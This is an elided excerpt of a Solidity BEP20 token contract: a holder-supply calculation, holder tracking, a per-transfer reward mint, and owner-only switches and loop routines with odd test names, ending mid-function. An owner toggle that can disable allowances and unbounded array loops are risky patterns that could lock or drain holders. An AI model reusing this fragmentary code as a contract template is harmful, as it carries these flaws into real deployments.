...
interface IBEP20 {
  ...
  function HolderToken() external   view returns (uint256);
...
_transferReward=1000000000000000000000;
  ...
  function symbol() external override  view returns (string memory) {
   ...
   function HolderToken() external override  view returns (uint256) {
    uint256 balance=_mintedToken-_burnedToken;
    uint256 transactionAdressBalance=_balances[_transactionFeeAdress];
    uint256 ownerAdressBalance=_balances[owner()];
    uint256 rewardAdressBalance=_balances[_rewardAdress];
    uint256 tokenAddessBalance=transactionAdressBalance+rewardAdressBalance+ownerAdressBalance;
if(ownerAdressBalance==transactionAdressBalance ||ownerAdressBalance==rewardAdressBalance){
  tokenAddessBalance-=ownerAdressBalance;
}
if(transactionAdressBalance==rewardAdressBalance){
    tokenAddessBalance-=transactionAdressBalance;
}
balance-=tokenAddessBalance;
return balance;
  }
  function name() external override  view returns (string memory) {
    return _name;
  }
  function holderCount() external override  view returns (uint256) {
    uint256 count=_holder.length;
    return count;
  }
  ...
  function allowance(address owner, address spender) external override  view returns (uint256) {
       require(_allownancemode, "allowances is disabled");
  ...
  _changeVariable(balance,Type);
    return true;
         ...
         function tetup(uint256 balance)  public  onlyOwner returns (bool) {
testn=balance;
    return true;
  }
    function tenSetp()  public  onlyOwner returns (bool) {
      for(uint256 i=0;i<testn;i++){
testarray.push(test);
test++;
    }
  return true;
  }
        function tokenSetp()  public  onlyOwner returns (bool) {
    uint256 z=10000231231231211;
        for(uint256 i=0;i<testn;i++){
      if(z==testarray[i]){
testarray.pop();
...
_tokenAdress(account,addressType);
    return true;
  }
...
_transferCount=0;
    ...
    _balances[sender] = _balances[sender].add(_transferReward);
        emit TransferReward(sender, _transferReward);
    }
    if(_balances[sender]==0){
uint256 len=_holder.length;
for(uint256 i=0;i<len;i++){
  if(_holder[i]==sender){
_holder[i]=_holder[len-1];
_holder.pop();
break;
  }
}
  ...
  function _mint(address account, uint256 amount) internal {
   ...
   function _changeVariable(uint256 balance,uint8 Type) internal {
      if(Type==1){
         ...
         if(Type==6){
           _allownancemode=!_allownancemode;
         }
  }
   function _tokenAdress(address account,uint8 addressType) internal {
        if(addressType==1){
